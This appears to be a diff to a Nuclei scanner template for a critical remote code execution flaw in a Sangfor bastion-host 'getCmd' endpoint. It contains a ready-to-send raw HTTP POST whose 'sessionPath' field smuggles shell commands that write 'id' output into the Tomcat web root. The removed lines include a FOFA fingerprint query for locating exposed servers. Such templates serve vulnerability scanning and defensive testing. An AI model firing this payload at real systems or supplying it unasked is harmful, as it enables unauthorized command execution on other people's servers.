@@ -3,12 +3,8 @@ info:
   name: 深信服运维安全管理系统 getCmd 存在远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wewtozwb0sabqcgk'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wewtozwb0sabqcgk
-    fofa: body="/fort/login" && header="FORTSESSIONID"
 http:
 - raw:
   - 'POST /isomp-protocol/protocol/getCmd HTTP/1.1
@@ -24,7 +20,7 @@ http:
     User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
 
 
-    sessionPath=;id>/usr/local/tomcat/webapps/isomp-protocol/qwer.txt;&sid=1![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1769350933810-6a636192-91da-45fa-a54a-432b8ee7db82.png)'
+    sessionPath=;id>/usr/local/tomcat/webapps/isomp-protocol/qwer.txt;&sid=1'
   redirects: false
   matchers:
   - status:
